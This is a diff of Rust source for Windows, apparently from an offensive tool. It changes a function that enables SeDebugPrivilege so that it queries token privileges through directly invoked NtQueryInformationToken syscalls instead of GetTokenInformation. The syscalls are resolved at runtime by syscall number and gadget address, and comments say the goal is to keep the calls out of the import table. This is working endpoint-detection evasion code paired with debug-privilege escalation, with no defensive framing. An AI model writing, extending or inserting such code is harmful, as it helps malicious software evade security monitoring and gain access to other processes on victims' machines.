@@ -704,8 +704,6 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 /// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
     use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
-    use winapi::um::winnt::TokenPrivileges;
-    use winapi::um::securitybaseapi::GetTokenInformation;
 
     // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
     // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
@@ -733,29 +731,48 @@ fn enable_debug_privilege() -> Result<bool> {
         }
     }
 
-    // Check if already enabled via GetTokenInformation (query-only, no privilege change).
+    // Check if already enabled via NtQueryInformationToken (query-only, no privilege change).
     let mut return_length: u32 = 0;
-    unsafe {
-        GetTokenInformation(
-            token,
-            TokenPrivileges,
-            ptr::null_mut(),
-            0,
-            &mut return_length,
-        );
+    {
+        let target = crate::syscalls::get_syscall_id("NtQueryInformationToken")
+            .map_err(|e| anyhow!("NtQueryInformationToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            crate::syscalls::do_syscall(
+                target.ssn,
+                target.gadget_addr,
+                &[
+                    token as u64,
+                    3u64,                           // TokenInformationClass = TokenPrivileges
+                    ptr::null_mut::<u8>() as u64,   // Buffer = NULL (length query)
+                    0u64,                           // BufferLength = 0
+                    &mut return_length as *mut _ as u64,
+                ],
+            )
+        };
+        // STATUS_BUFFER_TOO_SMALL (0xC0000023) is expected when querying length.
+        if !nt_success(status) && status as u32 != 0xC0000023 {
+            nt_close(token);
+            return Err(anyhow!("NtQueryInformationToken length query failed: 0x{status:08X}"));
+        }
     }
     let was_enabled = if return_length > 0 {
         let mut buf = vec![0u8; return_length as usize];
-        let ok = unsafe {
-            GetTokenInformation(
-                token,
-                TokenPrivileges,
-                buf.as_mut_ptr() as *mut _,
-                return_length,
-                &mut return_length,
+        let target2 = crate::syscalls::get_syscall_id("NtQueryInformationToken")
+            .map_err(|e| anyhow!("NtQueryInformationToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            crate::syscalls::do_syscall(
+                target2.ssn,
+                target2.gadget_addr,
+                &[
+                    token as u64,
+                    3u64,                           // TokenInformationClass = TokenPrivileges
+                    buf.as_mut_ptr() as u64,        // Buffer
+                    return_length as u64,           // BufferLength
+                    &mut return_length as *mut _ as u64,
+                ],
             )
         };
-        if ok != 0 {
+        if nt_success(status) {
             let tp = unsafe { &*(buf.as_ptr() as *const TOKEN_PRIVILEGES) };
             let count = tp.PrivilegeCount;
             let entries = unsafe {
